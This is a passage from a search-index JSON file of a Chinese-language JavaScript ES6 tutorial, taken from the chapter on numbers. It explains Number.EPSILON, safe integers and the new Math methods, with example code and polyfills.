<p>\u603b\u4e4b\uff0c\u5982\u679c\u5bf9\u6570\u636e\u7cbe\u5ea6\u7684\u8981\u6c42\u8f83\u9ad8\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528<code>Number.isInteger()</code>\u5224\u65ad\u4e00\u4e2a\u6570\u503c\u662f\u5426\u4e3a\u6574\u6570(\u5982\u679c\u5bf9\u6570\u636e\u7cbe\u5ea6\u7684\u8981\u6c42\u8f83\u9ad8\uff0c\u4e0d\u8981\u4f7f\u7528JS)\u3002</p>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#_2","title":"\u5e38\u91cf","text":""},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#numberepsilon","title":"Number.EPSILON","text":"<p>ES6 \u5728<code>Number</code>\u5bf9\u8c61\u4e0a\u9762\uff0c\u65b0\u589e\u4e00\u4e2a\u6781\u5c0f\u7684\u5e38\u91cf<code>Number.EPSILON</code>\u3002\u6839\u636e\u89c4\u683c\uff0c\u5b83\u8868\u793a 1 \u4e0e\u5927\u4e8e 1 \u7684\u6700\u5c0f\u6d6e\u70b9\u6570\u4e4b\u95f4\u7684\u5dee\u3002</p> <p>\u5bf9\u4e8e 64 \u4f4d\u6d6e\u70b9\u6570\u6765\u8bf4\uff0c\u5927\u4e8e 1 \u7684\u6700\u5c0f\u6d6e\u70b9\u6570\u76f8\u5f53\u4e8e\u4e8c\u8fdb\u5236\u7684<code>1.00..001</code>\uff0c\u5c0f\u6570\u70b9\u540e\u9762\u6709\u8fde\u7eed 51 \u4e2a\u96f6\u3002\u8fd9\u4e2a\u503c\u51cf\u53bb 1 \u4e4b\u540e\uff0c\u5c31\u7b49\u4e8e 2 \u7684 -52 \u6b21\u65b9\u3002</p> <pre><code>Number.EPSILON === Math.pow(2, -52)\n// true\nNumber.EPSILON\n// 2.220446049250313e-16\nNumber.EPSILON.toFixed(20)\n// \"0.00000000000000022204\"\n</code></pre> <p><code>Number.EPSILON</code>\u5b9e\u9645\u4e0a\u662f JavaScript \u80fd\u591f\u8868\u793a\u7684\u6700\u5c0f\u7cbe\u5ea6\u3002\u8bef\u5dee\u5982\u679c\u5c0f\u4e8e\u8fd9\u4e2a\u503c\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u5df2\u7ecf\u6ca1\u6709\u610f\u4e49\u4e86\uff0c\u5373\u4e0d\u5b58\u5728\u8bef\u5dee\u4e86\u3002</p> <p>\u5f15\u5165\u4e00\u4e2a\u8fd9\u4e48\u5c0f\u7684\u91cf\u7684\u76ee\u7684\uff0c\u5728\u4e8e\u4e3a\u6d6e\u70b9\u6570\u8ba1\u7b97\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u8bef\u5dee\u8303\u56f4\u3002\u6211\u4eec\u77e5\u9053\u6d6e\u70b9\u6570\u8ba1\u7b97\u662f\u4e0d\u7cbe\u786e\u7684\u3002</p> <pre><code>0.1 + 0.2\n// 0.30000000000000004\n\n0.1 + 0.2 - 0.3\n// 5.551115123125783e-17\n\n5.551115123125783e-17.toFixed(20)\n// '0.00000000000000005551'\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u89e3\u91ca\u4e86\uff0c\u4e3a\u4ec0\u4e48\u6bd4\u8f83<code>0.1 + 0.2</code>\u4e0e<code>0.3</code>\u5f97\u5230\u7684\u7ed3\u679c\u662f<code>false</code>\u3002</p> <pre><code>0.1 + 0.2 === 0.3 // false\n</code></pre> <p><code>Number.EPSILON</code>\u53ef\u4ee5\u7528\u6765\u8bbe\u7f6e\u201c\u80fd\u591f\u63a5\u53d7\u7684\u8bef\u5dee\u8303\u56f4\u201d\u3002\u6bd4\u5982\uff0c\u8bef\u5dee\u8303\u56f4\u8bbe\u4e3a 2 \u7684-50 \u6b21\u65b9\uff08\u5373<code>Number.EPSILON * Math.pow(2, 2)</code>\uff09\uff0c\u5373\u5982\u679c\u4e24\u4e2a\u6d6e\u70b9\u6570\u7684\u5dee\u5c0f\u4e8e\u8fd9\u4e2a\u503c\uff0c\u6211\u4eec\u5c31\u8ba4\u4e3a\u8fd9\u4e24\u4e2a\u6d6e\u70b9\u6570\u76f8\u7b49\u3002</p> <pre><code>5.551115123125783e-17 &lt; Number.EPSILON * Math.pow(2, 2)\n// true\n</code></pre> <p>\u56e0\u6b64\uff0c<code>Number.EPSILON</code>\u7684\u5b9e\u8d28\u662f\u4e00\u4e2a\u53ef\u4ee5\u63a5\u53d7\u7684\u6700\u5c0f\u8bef\u5dee\u8303\u56f4\u3002</p> <pre><code>function withinErrorMargin (left, right) {\n  return Math.abs(left - right) &lt; Number.EPSILON * Math.pow(2, 2);\n}\n\n0.1 + 0.2 === 0.3 // false\nwithinErrorMargin(0.1 + 0.2, 0.3) // true\n\n1.1 + 1.3 === 2.4 // false\nwithinErrorMargin(1.1 + 1.3, 2.4) // true\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u4e3a\u6d6e\u70b9\u6570\u8fd0\u7b97\uff0c\u90e8\u7f72\u4e86\u4e00\u4e2a\u8bef\u5dee\u68c0\u67e5\u51fd\u6570\u3002</p>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#numberissafeinteger","title":"Number.isSafeInteger()","text":"<p>JavaScript \u80fd\u591f\u51c6\u786e\u8868\u793a\u7684\u6574\u6570\u8303\u56f4\u5728<code>-2^53</code>\u5230<code>2^53</code>\u4e4b\u95f4\uff08\u4e0d\u542b\u4e24\u4e2a\u7aef\u70b9\uff09\uff0c\u8d85\u8fc7\u8fd9\u4e2a\u8303\u56f4\uff0c\u65e0\u6cd5\u7cbe\u786e\u8868\u793a\u8fd9\u4e2a\u503c\u3002</p> <pre><code>Math.pow(2, 53) // 9007199254740992\n\n9007199254740992  // 9007199254740992\n9007199254740993  // 9007199254740992\n\nMath.pow(2, 53) === Math.pow(2, 53) + 1\n// true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8d85\u51fa 2 \u7684 53 \u6b21\u65b9\u4e4b\u540e\uff0c\u4e00\u4e2a\u6570\u5c31\u4e0d\u7cbe\u786e\u4e86\u3002</p> <p>ES6 \u5f15\u5165\u4e86<code>Number.MAX_SAFE_INTEGER</code>\u548c<code>Number.MIN_SAFE_INTEGER</code>\u8fd9\u4e24\u4e2a\u5e38\u91cf\uff0c\u7528\u6765\u8868\u793a\u8fd9\u4e2a\u8303\u56f4\u7684\u4e0a\u4e0b\u9650\u3002</p> <pre><code>Number.MAX_SAFE_INTEGER === Math.pow(2, 53) - 1\n// true\nNumber.MAX_SAFE_INTEGER === 9007199254740991\n// true\n\nNumber.MIN_SAFE_INTEGER === -Number.MAX_SAFE_INTEGER\n// true\nNumber.MIN_SAFE_INTEGER === -9007199254740991\n// true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ef\u4ee5\u770b\u5230 JavaScript \u80fd\u591f\u7cbe\u786e\u8868\u793a\u7684\u6781\u9650\u3002</p> <p><code>Number.isSafeInteger()</code>\u5219\u662f\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u6574\u6570\u662f\u5426\u843d\u5728\u8fd9\u4e2a\u8303\u56f4\u4e4b\u5185\u3002</p> <pre><code>Number.isSafeInteger('a') // false\nNumber.isSafeInteger(null) // false\nNumber.isSafeInteger(NaN) // false\nNumber.isSafeInteger(Infinity) // false\nNumber.isSafeInteger(-Infinity) // false\n\nNumber.isSafeInteger(3) // true\nNumber.isSafeInteger(1.2) // false\nNumber.isSafeInteger(9007199254740990) // true\nNumber.isSafeInteger(9007199254740992) // false\n\nNumber.isSafeInteger(Number.MIN_SAFE_INTEGER - 1) // false\nNumber.isSafeInteger(Number.MIN_SAFE_INTEGER) // true\nNumber.isSafeInteger(Number.MAX_SAFE_INTEGER) // true\nNumber.isSafeInteger(Number.MAX_SAFE_INTEGER + 1) // false\n</code></pre> <p>\u8fd9\u4e2a\u51fd\u6570\u7684\u5b9e\u73b0\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u8ddf\u5b89\u5168\u6574\u6570\u7684\u4e24\u4e2a\u8fb9\u754c\u503c\u6bd4\u8f83\u4e00\u4e0b\u3002</p> <pre><code>Number.isSafeInteger = function (n) {\n  return (typeof n === 'number' &amp;&amp;\n    Math.round(n) === n &amp;&amp;\n    Number.MIN_SAFE_INTEGER &lt;= n &amp;&amp;\n    n &lt;= Number.MAX_SAFE_INTEGER);\n}\n</code></pre> <p>\u5b9e\u9645\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u3002\u9a8c\u8bc1\u8fd0\u7b97\u7ed3\u679c\u662f\u5426\u843d\u5728\u5b89\u5168\u6574\u6570\u7684\u8303\u56f4\u5185\uff0c\u4e0d\u8981\u53ea\u9a8c\u8bc1\u8fd0\u7b97\u7ed3\u679c\uff0c\u800c\u8981\u540c\u65f6\u9a8c\u8bc1\u53c2\u4e0e\u8fd0\u7b97\u7684\u6bcf\u4e2a\u503c\u3002</p> <pre><code>Number.isSafeInteger(9007199254740993)\n// false\nNumber.isSafeInteger(990)\n// true\nNumber.isSafeInteger(9007199254740993 - 990)\n// true\n9007199254740993 - 990\n// \u8fd4\u56de\u7ed3\u679c 9007199254740002\n// \u6b63\u786e\u7b54\u6848\u5e94\u8be5\u662f 9007199254740003\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>9007199254740993</code>\u4e0d\u662f\u4e00\u4e2a\u5b89\u5168\u6574\u6570\uff0c\u4f46\u662f<code>Number.isSafeInteger</code>\u4f1a\u8fd4\u56de\u7ed3\u679c\uff0c\u663e\u793a\u8ba1\u7b97\u7ed3\u679c\u662f\u5b89\u5168\u7684\u3002\u8fd9\u662f\u56e0\u4e3a\uff0c\u8fd9\u4e2a\u6570\u8d85\u51fa\u4e86\u7cbe\u5ea6\u8303\u56f4\uff0c\u5bfc\u81f4\u5728\u8ba1\u7b97\u673a\u5185\u90e8\uff0c\u4ee5<code>9007199254740992</code>\u7684\u5f62\u5f0f\u50a8\u5b58\u3002</p> <pre><code>9007199254740993 === 9007199254740992\n// true\n</code></pre> <p>\u6240\u4ee5\uff0c\u5982\u679c\u53ea\u9a8c\u8bc1\u8fd0\u7b97\u7ed3\u679c\u662f\u5426\u4e3a\u5b89\u5168\u6574\u6570\uff0c\u5f88\u53ef\u80fd\u5f97\u5230\u9519\u8bef\u7ed3\u679c\u3002\u4e0b\u9762\u7684\u51fd\u6570\u53ef\u4ee5\u540c\u65f6\u9a8c\u8bc1\u4e24\u4e2a\u8fd0\u7b97\u6570\u548c\u8fd0\u7b97\u7ed3\u679c\u3002</p> <pre><code>function trusty (left, right, result) {\n  if (\n    Number.isSafeInteger(left) &amp;&amp;\n    Number.isSafeInteger(right) &amp;&amp;\n    Number.isSafeInteger(result)\n  ) {\n    return result;\n  }\n  throw new RangeError('Operation cannot be trusted!');\n}\n\ntrusty(9007199254740993, 990, 9007199254740993 - 990)\n// RangeError: Operation cannot be trusted!\n\ntrusty(1, 2, 3)\n// 3\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#math","title":"Math \u5bf9\u8c61\u65b0\u65b9\u6cd5","text":"<p>\u6240\u6709\u8fd9\u4e9b\u65b9\u6cd5\u90fd\u662f\u9759\u6001\u65b9\u6cd5\uff0c\u53ea\u80fd\u5728 Math \u5bf9\u8c61\u4e0a\u8c03\u7528\u3002</p>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#mathtrunc","title":"Math.trunc() \u53d6\u6574\u51fd\u6570","text":"<p><code>Math.trunc</code>\u65b9\u6cd5\u7528\u4e8e\u53bb\u9664\u4e00\u4e2a\u6570\u7684\u5c0f\u6570\u90e8\u5206\uff0c\u8fd4\u56de\u6574\u6570\u90e8\u5206\u3002</p> <pre><code>Math.trunc(4.1) // 4\nMath.trunc(4.9) // 4\nMath.trunc(-4.1) // -4\nMath.trunc(-4.9) // -4\nMath.trunc(-0.1234) // -0\n</code></pre> <p>\u5bf9\u4e8e\u975e\u6570\u503c\uff0c<code>Math.trunc</code>\u5185\u90e8\u4f7f\u7528<code>Number</code>\u65b9\u6cd5\u5c06\u5176\u5148\u8f6c\u4e3a\u6570\u503c\u3002</p> <pre><code>Math.trunc('123.456') // 123\nMath.trunc(true) //1\nMath.trunc(false) // 0\nMath.trunc(null) // 0\n</code></pre> <p>\u5bf9\u4e8e\u7a7a\u503c\u548c\u65e0\u6cd5\u622a\u53d6\u6574\u6570\u7684\u503c\uff0c\u8fd4\u56de<code>NaN</code>\u3002</p> <pre><code>Math.trunc(NaN);      // NaN\nMath.trunc('foo');    // NaN\nMath.trunc();         // NaN\nMath.trunc(undefined) // NaN\n</code></pre> <p>\u5bf9\u4e8e\u6ca1\u6709\u90e8\u7f72\u8fd9\u4e2a\u65b9\u6cd5\u7684\u73af\u5883\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u6a21\u62df\u3002</p> <pre><code>Math.trunc = Math.trunc || function(x) {\n  return x &lt; 0 ? Math.ceil(x) : Math.floor(x);\n};\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#mathsign","title":"Math.sign() \u6b63\u8d1f\u5224\u65ad","text":"<p><code>Math.sign</code>\u65b9\u6cd5\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u6570\u5230\u5e95\u662f\u6b63\u6570\u3001\u8d1f\u6570\u3001\u8fd8\u662f\u96f6\u3002\u5bf9\u4e8e\u975e\u6570\u503c\uff0c\u4f1a\u5148\u5c06\u5176\u8f6c\u6362\u4e3a\u6570\u503c\u3002</p> <p>\u5b83\u4f1a\u8fd4\u56de\u4e94\u79cd\u503c\u3002</p> <ul> <li>\u53c2\u6570\u4e3a\u6b63\u6570\uff0c\u8fd4\u56de<code>+1</code>\uff1b</li> <li>\u53c2\u6570\u4e3a\u8d1f\u6570\uff0c\u8fd4\u56de<code>-1</code>\uff1b</li> <li>\u53c2\u6570\u4e3a 0\uff0c\u8fd4\u56de<code>0</code>\uff1b</li> <li>\u53c2\u6570\u4e3a-0\uff0c\u8fd4\u56de<code>-0</code>;</li> <li>\u5176\u4ed6\u503c\uff0c\u8fd4\u56de<code>NaN</code>\u3002</li> </ul> <pre><code>Math.sign(-5) // -1\nMath.sign(5) // +1\nMath.sign(0) // +0\nMath.sign(-0) // -0\nMath.sign(NaN) // NaN\n</code></pre> <p>\u5982\u679c\u53c2\u6570\u662f\u975e\u6570\u503c\uff0c\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u6570\u503c\u3002\u5bf9\u4e8e\u90a3\u4e9b\u65e0\u6cd5\u8f6c\u4e3a\u6570\u503c\u7684\u503c\uff0c\u4f1a\u8fd4\u56de<code>NaN</code>\u3002</p> <pre><code>Math.sign('')  // 0\nMath.sign(true)  // +1\nMath.sign(false)  // 0\nMath.sign(null)  // 0\nMath.sign('9')  // +1\nMath.sign('foo')  // NaN\nMath.sign()  // NaN\nMath.sign(undefined)  // NaN\n</code></pre> <p>\u5bf9\u4e8e\u6ca1\u6709\u90e8\u7f72\u8fd9\u4e2a\u65b9\u6cd5\u7684\u73af\u5883\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u6a21\u62df\u3002</p> <pre><code>Math.sign = Math.sign || function(x) {\n  x = +x; // convert to a number\n  if (x === 0 || isNaN(x)) {\n    return x;\n  }\n  return x &gt; 0 ? 1 : -1;\n};\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#mathcbrt","title":"Math.cbrt() \u7acb\u65b9\u6839","text":"<p><code>Math.cbrt</code>\u65b9\u6cd5\u7528\u4e8e\u8ba1\u7b97\u4e00\u4e2a\u6570\u7684\u7acb\u65b9\u6839\u3002</p> <pre><code>Math.cbrt(-1) // -1\nMath.cbrt(0)  // 0\nMath.cbrt(1)  // 1\nMath.cbrt(2)  // 1.2599210498948734\n</code></pre> <p>\u5bf9\u4e8e\u975e\u6570\u503c\uff0c<code>Math.cbrt</code>\u65b9\u6cd5\u5185\u90e8\u4e5f\u662f\u5148\u4f7f\u7528<code>Number</code>\u65b9\u6cd5\u5c06\u5176\u8f6c\u4e3a\u6570\u503c\u3002</p> <pre><code>Math.cbrt('8') // 2\nMath.cbrt('hello') // NaN\n</code></pre> <p>\u5bf9\u4e8e\u6ca1\u6709\u90e8\u7f72\u8fd9\u4e2a\u65b9\u6cd5\u7684\u73af\u5883\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u6a21\u62df\u3002</p> <pre><code>Math.cbrt = Math.cbrt || function(x) {\n  var y = Math.pow(Math.abs(x), 1/3);\n  return x &lt; 0 ? -y : y;\n};\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#_3","title":"\u5927\u6570\u8fd0\u7b97","text":""},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#mathclz32","title":"Math.clz32()","text":"<p><code>Math.clz32()</code>\u65b9\u6cd5\u5c06\u53c2\u6570\u8f6c\u4e3a 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u7684\u5f62\u5f0f\uff0c\u7136\u540e\u8fd4\u56de\u8fd9\u4e2a 32 \u4f4d\u503c\u91cc\u9762\u6709\u591a\u5c11\u4e2a\u524d\u5bfc 0\u3002</p> <pre><code>Math.clz32(0) // 32\nMath.clz32(1) // 31\nMath.clz32(1000) // 22\nMath.clz32(0b01000000000000000000000000000000) // 1\nMath.clz32(0b00100000000000000000000000000000) // 2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c0 \u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u5168\u4e3a 0\uff0c\u6240\u4ee5\u6709 32 \u4e2a\u524d\u5bfc 0\uff1b1 \u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u662f<code>0b1</code>\uff0c\u53ea\u5360 1 \u4f4d\uff0c\u6240\u4ee5 32 \u4f4d\u4e4b\u4e2d\u6709 31 \u4e2a\u524d\u5bfc 0\uff1b1000 \u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u662f<code>0b1111101000</code>\uff0c\u4e00\u5171\u6709 10 \u4f4d\uff0c\u6240\u4ee5 32 \u4f4d\u4e4b\u4e2d\u6709 22 \u4e2a\u524d\u5bfc 0\u3002</p> <p><code>clz32</code>\u8fd9\u4e2a\u51fd\u6570\u540d\u5c31\u6765\u81ea\u201dcount leading zero bits in 32-bit binary representation of a number\u201c\uff08\u8ba1\u7b97\u4e00\u4e2a\u6570\u7684 32 \u4f4d\u4e8c\u8fdb\u5236\u5f62\u5f0f\u7684\u524d\u5bfc 0 \u7684\u4e2a\u6570\uff09\u7684\u7f29\u5199\u3002</p> <p>\u5de6\u79fb\u8fd0\u7b97\u7b26\uff08<code>&lt;&lt;</code>\uff09\u4e0e<code>Math.clz32</code>\u65b9\u6cd5\u76f4\u63a5\u76f8\u5173\u3002</p> <pre><code>Math.clz32(0) // 32\nMath.clz32(1) // 31\nMath.clz32(1 &lt;&lt; 1) // 30\nMath.clz32(1 &lt;&lt; 2) // 29\nMath.clz32(1 &lt;&lt; 29) // 2\n</code></pre> <p>\u5bf9\u4e8e\u5c0f\u6570\uff0c<code>Math.clz32</code>\u65b9\u6cd5\u53ea\u8003\u8651\u6574\u6570\u90e8\u5206\u3002</p> <pre><code>Math.clz32(3.2) // 30\nMath.clz32(3.9) // 30\n</code></pre> <p>\u5bf9\u4e8e\u7a7a\u503c\u6216\u5176\u4ed6\u7c7b\u578b\u7684\u503c\uff0c<code>Math.clz32</code>\u65b9\u6cd5\u4f1a\u5c06\u5b83\u4eec\u5148\u8f6c\u4e3a\u6570\u503c\uff0c\u7136\u540e\u518d\u8ba1\u7b97\u3002</p> <pre><code>Math.clz32() // 32\nMath.clz32(NaN) // 32\nMath.clz32(Infinity) // 32\nMath.clz32(null) // 32\nMath.clz32('foo') // 32\nMath.clz32([]) // 32\nMath.clz32({}) // 32\nMath.clz32(true) // 31\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#mathimul","title":"Math.imul()","text":"<p><code>Math.imul</code>\u65b9\u6cd5\u8fd4\u56de\u4e24\u4e2a\u6570\u4ee5 32 \u4f4d\u5e26\u7b26\u53f7\u6574\u6570\u5f62\u5f0f\u76f8\u4e58\u7684\u7ed3\u679c\uff0c\u8fd4\u56de\u7684\u4e5f\u662f\u4e00\u4e2a 32 \u4f4d\u7684\u5e26\u7b26\u53f7\u6574\u6570\u3002</p> <pre><code>Math.imul(2, 4)   // 8\nMath.imul(-1, 8)  // -8\nMath.imul(-2, -2) // 4\n</code></pre> <p>\u5982\u679c\u53ea\u8003\u8651\u6700\u540e 32 \u4f4d\uff0c\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c<code>Math.imul(a, b)</code>\u4e0e<code>a * b</code>\u7684\u7ed3\u679c\u662f\u76f8\u540c\u7684\uff0c\u5373\u8be5\u65b9\u6cd5\u7b49\u540c\u4e8e<code>(a * b)|0</code>\u7684\u6548\u679c\uff08\u8d85\u8fc7 32 \u4f4d\u7684\u90e8\u5206\u6ea2\u51fa\uff09\u3002\u4e4b\u6240\u4ee5\u9700\u8981\u90e8\u7f72\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u662f\u56e0\u4e3a JavaScript \u6709\u7cbe\u5ea6\u9650\u5236\uff0c\u8d85\u8fc7 2 \u7684 53 \u6b21\u65b9\u7684\u503c\u65e0\u6cd5\u7cbe\u786e\u8868\u793a\u3002\u8fd9\u5c31\u662f\u8bf4\uff0c\u5bf9\u4e8e\u90a3\u4e9b\u5f88\u5927\u7684\u6570\u7684\u4e58\u6cd5\uff0c\u4f4e\u4f4d\u6570\u503c\u5f80\u5f80\u90fd\u662f\u4e0d\u7cbe\u786e\u7684\uff0c<code>Math.imul</code>\u65b9\u6cd5\u53ef\u4ee5\u8fd4\u56de\u6b63\u786e\u7684\u4f4e\u4f4d\u6570\u503c\u3002</p> <pre><code>(0x7fffffff * 0x7fffffff)|0 // 0\n</code></pre> <p>\u4e0a\u9762\u8fd9\u4e2a\u4e58\u6cd5\u7b97\u5f0f\uff0c\u8fd4\u56de\u7ed3\u679c\u4e3a 0\u3002\u4f46\u662f\u7531\u4e8e\u8fd9\u4e24\u4e2a\u4e8c\u8fdb\u5236\u6570\u7684\u6700\u4f4e\u4f4d\u90fd\u662f 1\uff0c\u6240\u4ee5\u8fd9\u4e2a\u7ed3\u679c\u80af\u5b9a\u662f\u4e0d\u6b63\u786e\u7684\uff0c\u56e0\u4e3a\u6839\u636e\u4e8c\u8fdb\u5236\u4e58\u6cd5\uff0c\u8ba1\u7b97\u7ed3\u679c\u7684\u4e8c\u8fdb\u5236\u6700\u4f4e\u4f4d\u5e94\u8be5\u4e5f\u662f 1\u3002\u8fd9\u4e2a\u9519\u8bef\u5c31\u662f\u56e0\u4e3a\u5b83\u4eec\u7684\u4e58\u79ef\u8d85\u8fc7\u4e86 2 \u7684 53 \u6b21\u65b9\uff0cJavaScript \u65e0\u6cd5\u4fdd\u5b58\u989d\u5916\u7684\u7cbe\u5ea6\uff0c\u5c31\u628a\u4f4e\u4f4d\u7684\u503c\u90fd\u53d8\u6210\u4e86 0\u3002<code>Math.imul</code>\u65b9\u6cd5\u53ef\u4ee5\u8fd4\u56de\u6b63\u786e\u7684\u503c 1\u3002</p> <pre><code>Math.imul(0x7fffffff, 0x7fffffff) // 1\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#mathfround","title":"Math.fround()","text":"<p><code>Math.fround</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u768432\u4f4d\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u5f62\u5f0f\u3002</p> <p>\u5bf9\u4e8e32\u4f4d\u5355\u7cbe\u5ea6\u683c\u5f0f\u6765\u8bf4\uff0c\u6570\u503c\u7cbe\u5ea6\u662f24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff081 \u4f4d\u9690\u85cf\u4f4d\u4e0e 23 \u4f4d\u6709\u6548\u4f4d\uff09\uff0c\u6240\u4ee5\u5bf9\u4e8e -224 \u81f3 224 \u4e4b\u95f4\u7684\u6574\u6570\uff08\u4e0d\u542b\u4e24\u4e2a\u7aef\u70b9\uff09\uff0c\u8fd4\u56de\u7ed3\u679c\u4e0e\u53c2\u6570\u672c\u8eab\u4e00\u81f4\u3002</p> <pre><code>Math.fround(0)   // 0\nMath.fround(1)   // 1\nMath.fround(2 ** 24 - 1)   // 16777215\n</code></pre> <p>\u5982\u679c\u53c2\u6570\u7684\u7edd\u5bf9\u503c\u5927\u4e8e 224\uff0c\u8fd4\u56de\u7684\u7ed3\u679c\u4fbf\u5f00\u59cb\u4e22\u5931\u7cbe\u5ea6\u3002</p> <pre><code>Math.fround(2 ** 24)       // 16777216\nMath.fround(2 ** 24 + 1)   // 16777216\n</code></pre> <p><code>Math.fround</code>\u65b9\u6cd5\u7684\u4e3b\u8981\u4f5c\u7528\uff0c\u662f\u5c0664\u4f4d\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8f6c\u4e3a32\u4f4d\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002\u5982\u679c\u5c0f\u6570\u7684\u7cbe\u5ea6\u8d85\u8fc724\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u8fd4\u56de\u503c\u5c31\u4f1a\u4e0d\u540c\u4e8e\u539f\u503c\uff0c\u5426\u5219\u8fd4\u56de\u503c\u4e0d\u53d8\uff08\u5373\u4e0e64\u4f4d\u53cc\u7cbe\u5ea6\u503c\u4e00\u81f4\uff09\u3002</p> <pre><code>// \u672a\u4e22\u5931\u6709\u6548\u7cbe\u5ea6\nMath.fround(1.125) // 1.125\nMath.fround(7.25)  // 7.25\n\n// \u4e22\u5931\u7cbe\u5ea6\nMath.fround(0.3)   // 0.30000001192092896\nMath.fround(0.7)   // 0.699999988079071\nMath.fround(1.0000000123) // 1\n</code></pre> <p>\u5bf9\u4e8e <code>NaN</code> \u548c <code>Infinity</code>\uff0c\u6b64\u65b9\u6cd5\u8fd4\u56de\u539f\u503c\u3002\u5bf9\u4e8e\u5176\u5b83\u7c7b\u578b\u7684\u975e\u6570\u503c\uff0c<code>Math.fround</code>\u65b9\u6cd5\u4f1a\u5148\u5c06\u5176\u8f6c\u4e3a\u6570\u503c\uff0c\u518d\u8fd4\u56de\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002</p> <pre><code>Math.fround(NaN)      // NaN\nMath.fround(Infinity) // Infinity\n\nMath.fround('5')      // 5\nMath.fround(true)     // 1\nMath.fround(null)     // 0\nMath.fround([])       // 0\nMath.fround({})       // NaN\n</code></pre> <p>\u5bf9\u4e8e\u6ca1\u6709\u90e8\u7f72\u8fd9\u4e2a\u65b9\u6cd5\u7684\u73af\u5883\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u6a21\u62df\u3002</p> <pre><code>Math.fround = Math.fround || function (x) {\n  return new Float32Array([x])[0];\n};\n</code></pre>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#mathhypot","title":"Math.hypot() \u52fe\u80a1\u5b9a\u7406","text":"<p><code>Math.hypot</code>\u65b9\u6cd5\u8fd4\u56de\u6240\u6709\u53c2\u6570\u7684\u5e73\u65b9\u548c\u7684\u5e73\u65b9\u6839\u3002</p> <pre><code>Math.hypot(3, 4);        // 5\nMath.hypot(3, 4, 5);     // 7.0710678118654755\nMath.hypot();            // 0\nMath.hypot(NaN);         // NaN\nMath.hypot(3, 4, 'foo'); // NaN\nMath.hypot(3, 4, '5');   // 7.0710678118654755\nMath.hypot(-3);          // 3\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c3 \u7684\u5e73\u65b9\u52a0\u4e0a 4 \u7684\u5e73\u65b9\uff0c\u7b49\u4e8e 5 \u7684\u5e73\u65b9\u3002</p> <p>\u5982\u679c\u53c2\u6570\u4e0d\u662f\u6570\u503c\uff0c<code>Math.hypot</code>\u65b9\u6cd5\u4f1a\u5c06\u5176\u8f6c\u4e3a\u6570\u503c\u3002\u53ea\u8981\u6709\u4e00\u4e2a\u53c2\u6570\u65e0\u6cd5\u8f6c\u4e3a\u6570\u503c\uff0c\u5c31\u4f1a\u8fd4\u56de NaN\u3002</p>"},{"location":"ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/#4","title":"4\u4e2a\u5bf9\u6570\u65b9\u6cd5","text":"<p>Math.expm1()</p> <p><code>Math.expm1(x)</code>\u8fd4\u56de ex - 1\uff0c\u5373<code>Math.exp(x) - 1</code>\u3002</p> <pre><code>Math.expm1(-1) // -0.6321205588285577\nMath.expm1(0)  // 0\nMath.expm1(1)  // 1.718281828459045\n</code></pre> <p>\u5bf9\u4e8e\u6ca1\u6709\u90e8\u7f72\u8fd9\u4e2a\u65b9\u6cd5\u7684\u73af\u5883\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u6a21\u62df\u3002</p> <pre><code>Math.expm1 = Math.expm1 || function(x) {\n  return Math.exp(x) - 1;\n};\n</code></pre> <p>Math.log1p()</p> <p><code>Math.log1p(x)</code>\u65b9\u6cd5\u8fd4\u56de<code>1 + x</code>\u7684\u81ea\u7136\u5bf9\u6570\uff0c\u5373<code>Math.log(1 + 